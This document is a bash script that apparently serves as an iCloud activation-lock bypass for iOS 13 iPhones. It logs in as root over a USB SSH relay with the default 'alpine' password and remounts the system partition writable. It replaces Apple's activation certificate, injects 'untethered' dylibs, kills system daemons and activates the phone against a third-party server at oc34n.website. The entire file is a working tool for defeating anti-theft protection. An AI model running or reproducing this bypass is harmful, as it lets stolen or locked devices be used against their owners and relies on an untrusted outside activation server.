echo 'DISCLAIMER : I AM NOT AFFILIATED WITH THE OC34N FORENSICS TEAM AT ALL'
echo 'FOR THIS BYPASS YOU WILL NEED TO REGISTER YOUR SERIAL OVER AT HTTPS://OC34N.PW/'
echo 'YOU WILL ALSO NEED A PIN LOCKED SIM CARD READY. DO NOT INSERT IT YET!'
read -p "PRESS ENTER ONCE YOU HAVE REGISTERED YOUR SERIAL AND HAVE A PIN LOCKED SIM"
rm ~/.ssh/known_hosts >/dev/null 2>&1
pgrep -f 'tcprelay.py' | xargs kill >/dev/null 2>&1
python iphonessh/python-client/tcprelay.py -t 44:2222 &
sleep 1
while true ; do 
  result=$(ssh -p 2222 -o BatchMode=yes -o ConnectTimeout=1 root@localhost echo ok 2>&1 | grep Connection) # -n shows line number
  echo "DEBUG: WAITING FOR CONNECTION, PLEASE DISCONNECT AND RE-CONNECT USB CABLE"
  sleep 1
  if [ -z "$result" ] ; then
echo 'CONNECTED TO DEVICE!'

sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 mount -o rw,union,update /
sshpass -p 'alpine' scp -P 2222 bypass_scripts/oc34n_activation_server_13_x/RaptorActivation.pem root@localhost:/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem
ideviceactivation activate -s http://oc34n.website/pentest/activ8.php
echo ""
echo "YOU CAN NOW ACCESS THE SPRINGBOARD"
echo "PLEASE INSTALL CYDIA AND DO COMPLETE UPGRADE"
echo "AFTER UPGRADE INSTALL CYDIA SUBSTRATE"
read -p "PRESS ENTER TO CONTINUE!"
echo ""
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 killall CommCenter && killall CommCenterMobileHelper
sshpass -p 'alpine' scp -P 2222 bypass_scripts/oc34n_activation_server_13_x/untethered.dylib root@localhost:/Library/MobileSubstrate/DynamicLibraries/untethered.dylib
sshpass -p 'alpine' scp -P 2222 bypass_scripts/oc34n_activation_server_13_x/untethered.plist root@localhost:/Library/MobileSubstrate/DynamicLibraries/untethered.plist
sshpass -p 'alpine' scp -P 2222 bypass_scripts/oc34n_activation_server_13_x/iuntethered.dylib root@localhost:/Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib
sshpass -p 'alpine' scp -P 2222 bypass_scripts/oc34n_activation_server_13_x/iuntethered.plist root@localhost:/Library/MobileSubstrate/DynamicLibraries/iuntethered.plist
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 ldrestart
sleep 6
ideviceactivation activate -s https://oc34n.website/pentest/activ8.php > /dev/null
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 rm /Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 rm /Library/MobileSubstrate/DynamicLibraries/iuntethered.plist
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 ldrestart
sleep 6
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 killall backboardd
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 killall thermalmonitord
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 killall lockdownd
sshpass -p 'alpine' scp -P 2222 bypass_scripts/oc34n_activation_server_13_x/iuntethered.dylib root@localhost:/Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib
sshpass -p 'alpine' scp -P 2222 bypass_scripts/oc34n_activation_server_13_x/iuntethered.plist root@localhost:/Library/MobileSubstrate/DynamicLibraries/iuntethered.plist
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 uicache --all
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 ldrestart
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 rm /Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 rm /Library/MobileSubstrate/DynamicLibraries/iuntethered.plist
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 uicache --all
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 2222 ldrestart
sleep 15
ideviceactivation activate -s http://oc34n.website/pentest/activ8.php
sleep 5
echo ""
ideviceactivation deactivate
read -p 'INSERT PIN LOCKED SIM AND PRESS ENTER!'
sleep 5
ideviceactivation activate -s http://oc34n.website/pentest/activ8.php > /dev/null
echo 'COMPLETE!'

pgrep -f 'tcprelay.py' | xargs kill >/dev/null 2>&1
    break
  fi
done

read -p "RETURN TO MENU? [ Y / N ] : " check

if [ $check = "Y" ]; then
bash hacktivation.sh
elif [ $check = "y" ]; then
bash hacktivation.sh
elif [ $check = "Yes" ]; then
bash hacktivation.sh
elif [ $check = "yes" ]; then
bash hacktivation.sh
elif [ $check = "YES" ]; then
bash hacktivation.sh
else
exit 1
fi

